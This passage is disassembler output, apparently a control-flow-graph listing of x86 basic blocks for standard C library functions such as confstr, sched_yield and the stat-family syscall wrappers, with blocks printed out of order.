None
|
|
|
v
0xb0b7aa8:	test	dl, dl
0xb0b7aaa:	je	0xb0b7b20
None
|
|
|
v
0xb0b7a5e:	cmp	eax, 0xff
0xb0b7a61:	mov	edx, eax
0xb0b7a63:	je	0xb0b7a38
None
|
|
|
v
0xb0b79fe:	jg	0xb0b7ac8
None
|
|
|
v
0xb0b7b90:	lea	eax, dword ptr [ebx - 0x48f17]
0xb0b7b96:	jmp	0xb0b7a1b
None
|
|
|
v
0xb0b79d0:	push	ebp
0xb0b79d1:	push	edi
0xb0b79d2:	push	esi
0xb0b79d3:	push	ebx
0xb0b79d4:	sub	esp, 0x4c
0xb0b79d7:	mov	esi, dword ptr [esp + 0x60]
0xb0b79db:	call	0xb1267db
None
|
|
|
v
0xb0b7a38:	mov	eax, dword ptr gs:[0]
0xb0b7a3e:	mov	ecx, dword ptr [ebx - 0xdc]
0xb0b7a44:	cmp	dword ptr [eax + ecx], 4
0xb0b7a48:	jne	0xb0b7a65
None
|
|
|
v
0xb0b7a65:	mov	ecx, ebp
0xb0b7a67:	xchg	ebx, ecx
0xb0b7a69:	mov	eax, 6
0xb0b7a6e:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0b7b60:	add	esp, 0x4c
0xb0b7b63:	mov	eax, 0x31069
0xb0b7b68:	pop	ebx
0xb0b7b69:	pop	esi
0xb0b7b6a:	pop	edi
0xb0b7b6b:	pop	ebp
0xb0b7b6c:	ret	
None
|
|
|
v
0xb0b7b28:	lea	eax, dword ptr [esp + 0x20]
0xb0b7b2c:	mov	dword ptr [esp + 4], eax
0xb0b7b30:	mov	dword ptr [esp], 3
0xb0b7b37:	call	0xb0e2960
None
|
|
|
v
0xb0b7b70:	lea	edi, dword ptr [esp + 0x20]
0xb0b7b74:	mov	dword ptr [esp + 4], edi
0xb0b7b78:	mov	dword ptr [esp], 0xb
0xb0b7b7f:	call	0xb0e2960
None
|
|
|
v
0xb0b7adc:	cmp	esi, 0x95
0xb0b7ae2:	jne	0xb0b7ab0
None
|
|
|
v
0xb0b7b47:	mov	edx, dword ptr [esp + 0x20]
0xb0b7b4b:	mov	ecx, edx
0xb0b7b4d:	shr	ecx, 2
0xb0b7b50:	cmp	edx, 0x80000
0xb0b7b56:	cmovae	eax, ecx
0xb0b7b59:	jmp	0xb0b7b20
None
|
|
|
v
0xb0b7a0c:	cmp	esi, 3
0xb0b7a0f:	lea	eax, dword ptr [ebx - 0x48efc]
0xb0b7a15:	jne	0xb0b7ab0
None
|
|
|
v
0xb0b7aa0:	movzx	edx, byte ptr [edx]
0xb0b7aa3:	cmp	dl, 0xa
0xb0b7aa6:	je	0xb0b7b20
None
|
|
|
v
0xb0b7a7b:	lea	eax, dword ptr [esp + 0x1c]
0xb0b7a7f:	mov	byte ptr [esp + edx + 0x20], 0
0xb0b7a84:	mov	dword ptr [esp + 8], 0xa
0xb0b7a8c:	mov	dword ptr [esp + 4], eax
0xb0b7a90:	mov	dword ptr [esp], edi
0xb0b7a93:	call	0xb034640
None
|
|
|
v
0xb0b79f5:	cmp	esi, 0x22
0xb0b79f8:	je	0xb0b7b70
None
|
|
|
v
0xb0b7aac:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0b7a2f:	cmp	eax, 0xff
0xb0b7a32:	mov	ebp, eax
0xb0b7a34:	jne	0xb0b7a4a
None
|
|
|
v
0xb0b7a75:	xchg	ebx, ecx
0xb0b7a77:	test	edx, edx
0xb0b7a79:	jle	0xb0b7ab0
None
|
|
|
v
0xb0b7b20:	add	esp, 0x4c
0xb0b7b23:	pop	ebx
0xb0b7b24:	pop	esi
0xb0b7b25:	pop	edi
0xb0b7b26:	pop	ebp
0xb0b7b27:	ret	
None
|
|
|
v
0xb0b7ab0:	cmp	esi, 0xf6
0xb0b7ab6:	ja	0xb0b80d5
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:confstr
TOTAL BLOCKS :105
0xb0c14c3:	jl	0xb0c14d0
None
|
|
|
v
0xb0c16ac:	mov	edx, dword ptr [esp + 0xc]
0xb0c16b0:	test	eax, eax
0xb0c16b2:	jle	0xb0c1798
None
|
|
|
v
0xb0c138a:	cmp	eax, 0x45d
0xb0c138f:	jne	0xb0c1528
None
|
|
|
v
0xb0c16d1:	mov	dword ptr [ebp + 8], 0x42504c5f
0xb0c16d8:	mov	dword ptr [ebp + 0xc], 0x4f5f4749
0xb0c16df:	mov	dword ptr [ebp + 0x10], 0x49424646
0xb0c16e6:	mov	byte ptr [ebp + 0x14], 0x47
0xb0c16ea:	lea	ebp, dword ptr [edx + 0x17]
0xb0c16ed:	add	edx, 0x16
0xb0c16f0:	mov	byte ptr [esp + edx + 0x18], 0
0xb0c16f5:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c14c5:	cmp	eax, 0x465
0xb0c14ca:	je	0xb0c15b8
None
|
|
|
v
0xb0c1346:	cmp	eax, 0x3ef
0xb0c134b:	jne	0xb0c1788
None
|
|
|
v
0xb0c11c7:	mov	dword ptr [esp], 0xb2
0xb0c11ce:	mov	dword ptr [esp + 0x18], 0x49534f50
0xb0c11d6:	mov	dword ptr [esp + 0x1c], 0x36565f58
0xb0c11de:	mov	dword ptr [esp + 0x20], 0x504c495f
0xb0c11e6:	mov	dword ptr [esp + 0x24], 0x4f5f3233
0xb0c11ee:	mov	dword ptr [esp + 0x28], 0x32334646
0xb0c11f6:	mov	byte ptr [esp + 0x2c], 0xa
0xb0c11fb:	mov	dword ptr [esp + 0x2d], 0x49534f50
0xb0c1203:	mov	dword ptr [esp + 0x31], 0x36565f58
0xb0c120b:	mov	dword ptr [esp + 0x35], 0x504c495f
0xb0c1213:	mov	dword ptr [esp + 0x39], 0x4f5f3233
0xb0c121b:	mov	dword ptr [esp + 0x3d], 0x49424646
0xb0c1223:	mov	byte ptr [esp + 0x41], 0x47
0xb0c1228:	call	0xb0b79d0
None
|
|
|
v
0xb0c1590:	jmp	0xb0c1528
None
|
|
|
v
0xb0c1758:	mov	ebp, 0x2b
0xb0c175d:	mov	edx, 0x2a
0xb0c1762:	jmp	0xb0c169c
None
|
|
|
v
0xb0c17be:	cmp	eax, 0x475
0xb0c17c3:	je	0xb0c15b8
None
|
|
|
v
0xb0c154f:	cmp	eax, 0x3e8
0xb0c1554:	jne	0xb0c1528
None
|
|
|
v
0xb0c12cc:	cmp	eax, 0x47b
0xb0c12d1:	jle	0xb0c17a8
None
|
|
|
v
0xb0c1528:	mov	eax, dword ptr [ebx - 0xdc]
0xb0c152e:	mov	edx, dword ptr gs:[0]
0xb0c1535:	mov	dword ptr [edx + eax], 0x16
0xb0c153c:	xor	eax, eax
0xb0c153e:	jmp	0xb0c131a
None
|
|
|
v
0xb0c136d:	cmp	eax, 0x45f
0xb0c1372:	jg	0xb0c15e0
None
|
|
|
v
0xb0c1568:	cmp	eax, 0x472
0xb0c156d:	jge	0xb0c14d0
None
|
|
|
v
0xb0c1656:	test	eax, eax
0xb0c1658:	jle	0xb0c1758
None
|
|
|
v
0xb0c13c0:	cmp	eax, 3
0xb0c13c3:	je	0xb0c1700
None
|
|
|
v
0xb0c1308:	mov	dword ptr [esp + 8], ebp
0xb0c130c:	mov	dword ptr [esp + 4], eax
0xb0c1310:	mov	dword ptr [esp], edi
0xb0c1313:	call	0xb07d0b0
None
|
|
|
v
0xb0c14d0:	mov	ebp, 1
0xb0c14d5:	lea	eax, dword ptr [ebx - 0x4aa73]
0xb0c14db:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c13b0:	add	esp, 0x7c
0xb0c13b3:	mov	eax, ebp
0xb0c13b5:	pop	ebx
0xb0c13b6:	pop	esi
0xb0c13b7:	pop	edi
0xb0c13b8:	pop	ebp
0xb0c13b9:	ret	
None
|
|
|
v
0xb0c1788:	cmp	eax, 0x44c
0xb0c178d:	je	0xb0c1398
None
|
|
|
v
0xb0c12f0:	test	esi, esi
0xb0c12f2:	je	0xb0c13b0
None
|
|
|
v
0xb0c1508:	cmp	eax, 0x3ea
0xb0c150d:	jle	0xb0c1548
None
|
|
|
v
0xb0c15cc:	mov	ebp, 5
0xb0c15d1:	lea	eax, dword ptr [ebx - 0x48dcf]
0xb0c15d7:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c1516:	cmp	eax, 0x3ec
0xb0c151b:	je	0xb0c1351
None
|
|
|
v
0xb0c157e:	cmp	eax, 0x470
0xb0c1583:	je	0xb0c15e0
None
|
|
|
v
0xb0c1193:	cmp	eax, 5
0xb0c1196:	je	0xb0c15f0
None
|
|
|
v
0xb0c1360:	cmp	eax, 0x461
0xb0c1365:	je	0xb0c1398
None
|
|
|
v
0xb0c1318:	mov	eax, ebp
0xb0c131a:	add	esp, 0x7c
0xb0c131d:	pop	ebx
0xb0c131e:	pop	esi
0xb0c131f:	pop	edi
0xb0c1320:	pop	ebp
0xb0c1321:	ret	
None
|
|
|
v
0xb0c14f3:	mov	eax, ebp
0xb0c14f5:	mov	byte ptr [edi + esi - 1], 0
0xb0c14fa:	add	esp, 0x7c
0xb0c14fd:	pop	ebx
0xb0c14fe:	pop	esi
0xb0c14ff:	pop	edi
0xb0c1500:	pop	ebp
0xb0c1501:	ret	
None
|
|
|
v
0xb0c14e0:	lea	edx, dword ptr [esi - 1]
0xb0c14e3:	mov	dword ptr [esp], edi
0xb0c14e6:	mov	dword ptr [esp + 8], edx
0xb0c14ea:	mov	dword ptr [esp + 4], eax
0xb0c14ee:	call	0xb07d0b0
None
|
|
|
v
0xb0c13d2:	mov	dword ptr [esp], 0x7f
0xb0c13d9:	mov	dword ptr [esp + 0x18], 0x35534258
0xb0c13e1:	mov	dword ptr [esp + 0x1c], 0x504c495f
0xb0c13e9:	mov	dword ptr [esp + 0x20], 0x4f5f3233
0xb0c13f1:	mov	dword ptr [esp + 0x24], 0x32334646
0xb0c13f9:	mov	byte ptr [esp + 0x28], 0xa
0xb0c13fe:	mov	dword ptr [esp + 0x29], 0x35534258
0xb0c1406:	mov	dword ptr [esp + 0x2d], 0x504c495f
0xb0c140e:	mov	dword ptr [esp + 0x31], 0x4f5f3233
0xb0c1416:	mov	dword ptr [esp + 0x35], 0x49424646
0xb0c141e:	mov	byte ptr [esp + 0x39], 0x47
0xb0c1423:	call	0xb0b79d0
None
|
|
|
v
0xb0c1367:	jg	0xb0c14b8
None
|
|
|
v
0xb0c1700:	mov	ebp, 0xa
0xb0c1705:	lea	eax, dword ptr [ebx - 0x48dca]
0xb0c170b:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c1548:	cmp	eax, 0x3e9
0xb0c154d:	jge	0xb0c14d0
None
|
|
|
v
0xb0c15b8:	mov	dword ptr [esp], 0xef
0xb0c15bf:	call	0xb0b79d0
None
|
|
|
v
0xb0c1383:	cmp	eax, 0x45c
0xb0c1388:	je	0xb0c1398
None
|
|
|
v
0xb0c1395:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0c1768:	mov	ebp, 0x2b
0xb0c176d:	mov	edx, 0x2a
0xb0c1772:	jmp	0xb0c1273
None
|
|
|
v
0xb0c1153:	add	ebx, 0xe9ead
0xb0c1159:	mov	edi, dword ptr [esp + 0x94]
0xb0c1160:	mov	esi, dword ptr [esp + 0x98]
0xb0c1167:	cmp	eax, 0x45b
0xb0c116c:	jg	0xb0c12b0
None
|
|
|
v
0xb0c1140:	push	ebp
0xb0c1141:	push	edi
0xb0c1142:	push	esi
0xb0c1143:	push	ebx
0xb0c1144:	sub	esp, 0x7c
0xb0c1147:	mov	eax, dword ptr [esp + 0x90]
0xb0c114e:	call	0xb1267db
None
|
|
|
v
0xb0c13ab:	nop	
0xb0c13ac:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0c117d:	cmp	eax, 0x3ee
0xb0c1182:	jg	0xb0c1328
None
|
|
|
v
0xb0c1340:	jg	0xb0c14d0
None
|
|
|
v
0xb0c122d:	test	eax, eax
0xb0c122f:	jle	0xb0c1768
None
|
|
|
v
0xb0c17c9:	jmp	0xb0c1528
None
|
|
|
v
0xb0c1378:	cmp	eax, 0x45e
0xb0c137d:	jge	0xb0c14d0
None
|
|
|
v
0xb0c17b3:	cmp	eax, 0x474
0xb0c17b8:	je	0xb0c15b8
None
|
|
|
v
0xb0c15f0:	mov	dword ptr [esp], 0xef
0xb0c15f7:	mov	dword ptr [esp + 0x18], 0x49534f50
0xb0c15ff:	mov	dword ptr [esp + 0x1c], 0x37565f58
0xb0c1607:	mov	dword ptr [esp + 0x20], 0x504c495f
0xb0c160f:	mov	dword ptr [esp + 0x24], 0x4f5f3233
0xb0c1617:	mov	dword ptr [esp + 0x28], 0x32334646
0xb0c161f:	mov	byte ptr [esp + 0x2c], 0xa
0xb0c1624:	mov	dword ptr [esp + 0x2d], 0x49534f50
0xb0c162c:	mov	dword ptr [esp + 0x31], 0x37565f58
0xb0c1634:	mov	dword ptr [esp + 0x35], 0x504c495f
0xb0c163c:	mov	dword ptr [esp + 0x39], 0x4f5f3233
0xb0c1644:	mov	dword ptr [esp + 0x3d], 0x49424646
0xb0c164c:	mov	byte ptr [esp + 0x41], 0x47
0xb0c1651:	call	0xb0b79d0
None
|
|
|
v
0xb0c1585:	cmp	eax, 0x471
0xb0c158a:	je	0xb0c1398
None
|
|
|
v
0xb0c1273:	mov	dword ptr [esp], 0xb3
0xb0c127a:	mov	dword ptr [esp + 0xc], edx
0xb0c127e:	call	0xb0b79d0
None
|
|
|
v
0xb0c173b:	jmp	0xb0c14d0
None
|
|
|
v
0xb0c1598:	cmp	eax, 0x453
0xb0c159d:	jle	0xb0c1740
None
|
|
|
v
0xb0c12e2:	mov	ebp, 0x12
0xb0c12e7:	lea	eax, dword ptr [ebx - 0x48d9f]
0xb0c12ed:	lea	esi, dword ptr [esi]
0xb0c12f0:	test	esi, esi
0xb0c12f2:	je	0xb0c13b0
None
|
|
|
v
0xb0c14b8:	cmp	eax, 0x464
0xb0c14bd:	je	0xb0c15b8
None
|
|
|
v
0xb0c1428:	test	eax, eax
0xb0c142a:	jle	0xb0c1778
None
|
|
|
v
0xb0c1778:	mov	ebp, 0x23
0xb0c177d:	mov	edx, 0x22
0xb0c1782:	jmp	0xb0c1466
None
|
|
|
v
0xb0c12c1:	cmp	eax, 0x473
0xb0c12c6:	jle	0xb0c1568
None
|
|
|
v
0xb0c15aa:	cmp	eax, 0x455
0xb0c15af:	jne	0xb0c1528
None
|
|
|
v
0xb0c13c9:	cmp	eax, 4
0xb0c13cc:	jne	0xb0c1528
None
|
|
|
v
0xb0c12bb:	jle	0xb0c1360
None
|
|
|
v
0xb0c119c:	jg	0xb0c1508
None
|
|
|
v
0xb0c16b8:	lea	eax, dword ptr [esp + 0x18]
0xb0c16bc:	add	ebp, eax
0xb0c16be:	mov	byte ptr [esp + edx + 0x18], 0xa
0xb0c16c3:	mov	dword ptr [ebp], 0x49534f50
0xb0c16ca:	mov	dword ptr [ebp + 4], 0x37565f58
0xb0c16d1:	mov	dword ptr [ebp + 8], 0x42504c5f
0xb0c16d8:	mov	dword ptr [ebp + 0xc], 0x4f5f4749
0xb0c16df:	mov	dword ptr [ebp + 0x10], 0x49424646
0xb0c16e6:	mov	byte ptr [ebp + 0x14], 0x47
0xb0c16ea:	lea	ebp, dword ptr [edx + 0x17]
0xb0c16ed:	add	edx, 0x16
0xb0c16f0:	mov	byte ptr [esp + edx + 0x18], 0
0xb0c16f5:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c11a2:	cmp	eax, 2
0xb0c11a5:	je	0xb0c1710
None
|
|
|
v
0xb0c169c:	mov	dword ptr [esp], 0xf0
0xb0c16a3:	mov	dword ptr [esp + 0xc], edx
0xb0c16a7:	call	0xb0b79d0
None
|
|
|
v
0xb0c11be:	cmp	eax, 1
0xb0c11c1:	jne	0xb0c1528
None
|
|
|
v
0xb0c12b0:	cmp	eax, 0x46c
0xb0c12b5:	je	0xb0c1398
None
|
|
|
v
0xb0c1172:	cmp	eax, 0x456
0xb0c1177:	jge	0xb0c14d0
None
|
|
|
v
0xb0c1235:	mov	edx, 0x3646
0xb0c123a:	mov	ebp, 0x3f
0xb0c123f:	mov	word ptr [esp + 0x53], dx
0xb0c1244:	mov	edx, 0x3e
0xb0c1249:	mov	byte ptr [esp + 0x42], 0xa
0xb0c124e:	mov	dword ptr [esp + 0x43], 0x49534f50
0xb0c1256:	mov	dword ptr [esp + 0x47], 0x36565f58
0xb0c125e:	mov	dword ptr [esp + 0x4b], 0x36504c5f
0xb0c1266:	mov	dword ptr [esp + 0x4f], 0x464f5f34
0xb0c126e:	mov	byte ptr [esp + 0x55], 0x34
0xb0c1273:	mov	dword ptr [esp], 0xb3
0xb0c127a:	mov	dword ptr [esp + 0xc], edx
0xb0c127e:	call	0xb0b79d0
None
|
|
|
v
0xb0c1730:	cmp	eax, 0x46e
0xb0c1735:	jl	0xb0c1398
None
|
|
|
v
0xb0c12f8:	test	edi, edi
0xb0c12fa:	je	0xb0c13b0
None
|
|
|
v
0xb0c1333:	jg	0xb0c1598
None
|
|
|
v
0xb0c12d7:	cmp	eax, 0x47d
0xb0c12dc:	jg	0xb0c1528
None
|
|
|
v
0xb0c17a8:	cmp	eax, 0x476
0xb0c17ad:	jge	0xb0c14d0
None
|
|
|
v
0xb0c1339:	cmp	eax, 0x44d
0xb0c133e:	je	0xb0c1398
None
|
|
|
v
0xb0c15e0:	mov	ebp, 0x30
0xb0c15e5:	lea	eax, dword ptr [ebx - 0x430a0]
0xb0c15eb:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c1573:	cmp	eax, 0x46f
0xb0c1578:	jle	0xb0c1730
None
|
|
|
v
0xb0c1710:	mov	ebp, 0xb
0xb0c1715:	lea	eax, dword ptr [ebx - 0x48dc0]
0xb0c171b:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c16f0:	mov	byte ptr [esp + edx + 0x18], 0
0xb0c16f5:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c15b5:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0c11b6:	test	eax, eax
0xb0c11b8:	je	0xb0c1720
None
|
|
|
v
0xb0c1521:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0c1351:	mov	ebp, 0x16
0xb0c1356:	lea	eax, dword ptr [ebx - 0x48db5]
0xb0c135c:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c1798:	lea	eax, dword ptr [esp + 0x18]
0xb0c179c:	jmp	0xb0c16f0
None
|
|
|
v
0xb0c11ab:	nop	
0xb0c11ac:	lea	esi, dword ptr [esi]
0xb0c11b0:	jg	0xb0c13c0
None
|
|
|
v
0xb0c128f:	lea	eax, dword ptr [esp + 0x18]
0xb0c1293:	add	ebp, eax
0xb0c1295:	mov	byte ptr [esp + edx + 0x18], 0xa
0xb0c129a:	mov	dword ptr [ebp], 0x49534f50
0xb0c12a1:	mov	dword ptr [ebp + 4], 0x36565f58
0xb0c12a8:	jmp	0xb0c16d1
None
|
|
|
v
0xb0c165e:	mov	ecx, 0x3646
0xb0c1663:	mov	ebp, 0x3f
0xb0c1668:	mov	byte ptr [esp + 0x42], 0xa
0xb0c166d:	mov	edx, 0x3e
0xb0c1672:	mov	dword ptr [esp + 0x43], 0x49534f50
0xb0c167a:	mov	dword ptr [esp + 0x47], 0x37565f58
0xb0c1682:	mov	dword ptr [esp + 0x4b], 0x36504c5f
0xb0c168a:	mov	dword ptr [esp + 0x4f], 0x464f5f34
0xb0c1692:	mov	word ptr [esp + 0x53], cx
0xb0c1697:	mov	byte ptr [esp + 0x55], 0x34
0xb0c169c:	mov	dword ptr [esp], 0xf0
0xb0c16a3:	mov	dword ptr [esp + 0xc], edx
0xb0c16a7:	call	0xb0b79d0
None
|
|
|
v
0xb0c131a:	add	esp, 0x7c
0xb0c131d:	pop	ebx
0xb0c131e:	pop	esi
0xb0c131f:	pop	edi
0xb0c1320:	pop	ebp
0xb0c1321:	ret	
None
|
|
|
v
0xb0c1720:	mov	ebp, 0xe
0xb0c1725:	lea	eax, dword ptr [ebx - 0x48d8d]
0xb0c172b:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c15a3:	cmp	eax, 0x454
0xb0c15a8:	je	0xb0c15b8
None
|
|
|
v
0xb0c1188:	cmp	eax, 0x3ed
0xb0c118d:	jge	0xb0c14d0
None
|
|
|
v
0xb0c1398:	test	esi, esi
0xb0c139a:	mov	ebp, 5
0xb0c139f:	lea	eax, dword ptr [ebx - 0x48dd4]
0xb0c13a5:	jne	0xb0c12f8
None
|
|
|
v
0xb0c15c4:	test	eax, eax
0xb0c15c6:	js	0xb0c14d0
None
|
|
|
v
0xb0c1476:	mov	edx, dword ptr [esp + 0xc]
0xb0c147a:	test	eax, eax
0xb0c147c:	jle	0xb0c1798
None
|
|
|
v
0xb0c150f:	cmp	eax, 0x3eb
0xb0c1514:	je	0xb0c1556
None
|
|
|
v
0xb0c1300:	cmp	ebp, esi
0xb0c1302:	ja	0xb0c14e0
None
|
|
|
v
0xb0c1466:	mov	dword ptr [esp], 0x80
0xb0c146d:	mov	dword ptr [esp + 0xc], edx
0xb0c1471:	call	0xb0b79d0
None
|
|
|
v
0xb0c1430:	mov	eax, 0x3646
0xb0c1435:	mov	ebp, 0x33
0xb0c143a:	mov	byte ptr [esp + 0x3a], 0xa
0xb0c143f:	mov	edx, 0x32
0xb0c1444:	mov	dword ptr [esp + 0x3b], 0x35534258
0xb0c144c:	mov	dword ptr [esp + 0x3f], 0x36504c5f
0xb0c1454:	mov	dword ptr [esp + 0x43], 0x464f5f34
0xb0c145c:	mov	word ptr [esp + 0x47], ax
0xb0c1461:	mov	byte ptr [esp + 0x49], 0x34
0xb0c1466:	mov	dword ptr [esp], 0x80
0xb0c146d:	mov	dword ptr [esp + 0xc], edx
0xb0c1471:	call	0xb0b79d0
None
|
|
|
v
0xb0c174b:	nop	
0xb0c174c:	lea	esi, dword ptr [esi]
0xb0c1750:	jmp	0xb0c14d0
None
|
|
|
v
0xb0c1283:	mov	edx, dword ptr [esp + 0xc]
0xb0c1287:	test	eax, eax
0xb0c1289:	jle	0xb0c1798
None
|
|
|
v
0xb0c1328:	cmp	eax, 0x450
0xb0c132d:	je	0xb0c15e0
None
|
|
|
v
0xb0c1556:	mov	ebp, 0x2b
0xb0c155b:	lea	eax, dword ptr [ebx - 0x43070]
0xb0c1561:	jmp	0xb0c12f0
None
|
|
|
v
0xb0c1793:	jmp	0xb0c1528
None
|
|
|
v
0xb0c1740:	cmp	eax, 0x452
0xb0c1745:	jl	0xb0c1398
None
|
|
|
v
0xb0c1482:	lea	eax, dword ptr [esp + 0x18]
0xb0c1486:	add	ebp, eax
0xb0c1488:	mov	byte ptr [esp + edx + 0x18], 0xa
0xb0c148d:	mov	dword ptr [ebp], 0x35534258
0xb0c1494:	mov	dword ptr [ebp + 4], 0x42504c5f
0xb0c149b:	mov	dword ptr [ebp + 8], 0x4f5f4749
0xb0c14a2:	mov	dword ptr [ebp + 0xc], 0x49424646
0xb0c14a9:	mov	byte ptr [ebp + 0x10], 0x47
0xb0c14ad:	lea	ebp, dword ptr [edx + 0x13]
0xb0c14b0:	add	edx, 0x12
0xb0c14b3:	jmp	0xb0c16f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sched_yield
TOTAL BLOCKS :5
0xb0c2d84:	call	0xb1267df
None
|
|
|
v
0xb0c2d7c:	cmp	eax, 0xfffff001
0xb0c2d81:	jae	0xb0c2d84
None
|
|
|
v
0xb0c2d83:	ret	
None
|
|
|
v
0xb0c2d89:	add	ecx, 0xe8277
0xb0c2d8f:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0c2d95:	neg	eax
0xb0c2d97:	add	ecx, dword ptr gs:[0]
0xb0c2d9e:	mov	dword ptr [ecx], eax
0xb0c2da0:	or	eax, 0xffffffff
0xb0c2da3:	ret	
None
|
|
|
v
0xb0c2d70:	mov	eax, 0x9e
0xb0c2d75:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__xstat
TOTAL BLOCKS :11
0xb0da0f6:	mov	edx, dword ptr [ebx - 0xdc]
0xb0da0fc:	neg	eax
0xb0da0fe:	mov	ecx, dword ptr gs:[0]
0xb0da105:	mov	dword ptr [ecx + edx], eax
0xb0da108:	or	eax, 0xffffffff
0xb0da10b:	jmp	0xb0da0cf
None
|
|
|
v
0xb0da12e:	add	esp, 0x78
0xb0da131:	pop	ebx
0xb0da132:	ret	
None
|
|
|
v
0xb0da0c2:	xchg	ebx, edx
0xb0da0c4:	cmp	eax, 0xfffff000
0xb0da0c9:	ja	0xb0da0f6
None
|
|
|
v
0xb0da090:	push	ebx
0xb0da091:	sub	esp, 0x78
0xb0da094:	call	0xb1267db
None
|
|
|
v
0xb0da110:	mov	eax, dword ptr [esp + 0x88]
0xb0da117:	mov	dword ptr [esp + 4], ecx
0xb0da11b:	mov	dword ptr [esp + 8], eax
0xb0da11f:	mov	eax, dword ptr [esp + 0x80]
0xb0da126:	mov	dword ptr [esp], eax
0xb0da129:	call	0xb0e14f0
None
|
|
|
v
0xb0da0cb:	test	eax, eax
0xb0da0cd:	je	0xb0da110
None
|
|
|
v
0xb0da0ed:	xchg	ebx, edx
0xb0da0ef:	cmp	eax, 0xfffff000
0xb0da0f4:	jbe	0xb0da0cf
None
|
|
|
v
0xb0da0cf:	add	esp, 0x78
0xb0da0d2:	pop	ebx
0xb0da0d3:	ret	
None
|
|
|
v
0xb0da0d8:	mov	ecx, dword ptr [esp + 0x88]
0xb0da0df:	xchg	ebx, edx
0xb0da0e1:	mov	eax, 0x6a
0xb0da0e6:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0da0b0:	lea	ecx, dword ptr [esp + 0x10]
0xb0da0b4:	xchg	ebx, edx
0xb0da0b6:	mov	eax, 0xc3
0xb0da0bb:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0da099:	add	ebx, 0xd0f67
0xb0da09f:	mov	edx, dword ptr [esp + 0x84]
0xb0da0a6:	cmp	dword ptr [esp + 0x80], 1
0xb0da0ae:	je	0xb0da0d8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__xstat64
TOTAL BLOCKS :5
0xb0da2aa:	add	ebx, 0xd0d56
0xb0da2b0:	mov	edx, dword ptr [esp + 0xc]
0xb0da2b4:	xchg	ebx, edx
0xb0da2b6:	mov	eax, 0xc3
0xb0da2bb:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0da2cb:	pop	ebx
0xb0da2cc:	ret	
None
|
|
|
v
0xb0da2cd:	mov	edx, dword ptr [ebx - 0xdc]
0xb0da2d3:	neg	eax
0xb0da2d5:	mov	ecx, dword ptr gs:[0]
0xb0da2dc:	mov	dword ptr [ecx + edx], eax
0xb0da2df:	or	eax, 0xffffffff
0xb0da2e2:	pop	ebx
0xb0da2e3:	ret	
None
|
|
|
v
0xb0da2a0:	push	ebx
0xb0da2a1:	mov	ecx, dword ptr [esp + 0x10]
0xb0da2a5:	call	0xb1267db
None
|
|
|
v
0xb0da2c2:	xchg	ebx, edx
0xb0da2c4:	cmp	eax, 0xfffff000
0xb0da2c9:	ja	0xb0da2cd
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__fxstat64
TOTAL BLOCKS :5
0xb0da2fa:	add	ebx, 0xd0d06
0xb0da300:	mov	edx, dword ptr [esp + 0xc]
0xb0da304:	xchg	ebx, edx
0xb0da306:	mov	eax, 0xc5
0xb0da30b:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0da31b:	pop	ebx
0xb0da31c:	ret	
None
|
|
|
v
0xb0da31d:	mov	edx, dword ptr [ebx - 0xdc]
0xb0da323:	neg	eax
0xb0da325:	mov	ecx, dword ptr gs:[0]
0xb0da32c:	mov	dword ptr [ecx + edx], eax
0xb0da32f:	or	eax, 0xffffffff
0xb0da332:	pop	ebx
0xb0da333:	ret	
None
|
|
|
v
0xb0da2f0:	push	ebx
0xb0da2f1:	mov	ecx, dword ptr [esp + 0x10]
0xb0da2f5:	call	0xb1267db
None
|
|
|
v
0xb0da312:	xchg	ebx, edx
0xb0da314:	cmp	eax, 0xfffff000
0xb0da319:	ja	0xb0da31d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__lxstat64
TOTAL BLOCKS :5
0xb0da34a:	add	ebx, 0xd0cb6
0xb0da350:	mov	edx, dword ptr [esp + 0xc]
0xb0da354:	xchg	ebx, edx
0xb0da356:	mov	eax, 0xc4
0xb0da35b:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0da36b:	pop	ebx
0xb0da36c:	ret	
None
|
|
|
v
0xb0da36d:	mov	edx, dword ptr [ebx - 0xdc]
0xb0da373:	neg	eax
0xb0da375:	mov	ecx, dword ptr gs:[0]
0xb0da37c:	mov	dword ptr [ecx + edx], eax
0xb0da37f:	or	eax, 0xffffffff
0xb0da382:	pop	ebx
0xb0da383:	ret	
None
|
|
|
v
0xb0da340:	push	ebx
0xb0da341:	mov	ecx, dword ptr [esp + 0x10]
0xb0da345:	call	0xb1267db
None
|
|
|
v
0xb0da362:	xchg	ebx, edx
0xb0da364:	cmp	eax, 0xfffff000
0xb0da369:	ja	0xb0da36d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__fxstatat64
TOTAL BLOCKS :8
0xb0da553:	xchg	ebx, edi
0xb0da555:	cmp	eax, 0xfffff000
0xb0da55a:	jbe	0xb0da590
None
|
|
|
v
0xb0da528:	add	ebx, 0xd0ad8
0xb0da52e:	cmp	dword ptr [esp + 0x10], 3
0xb0da533:	jne	0xb0da577
None
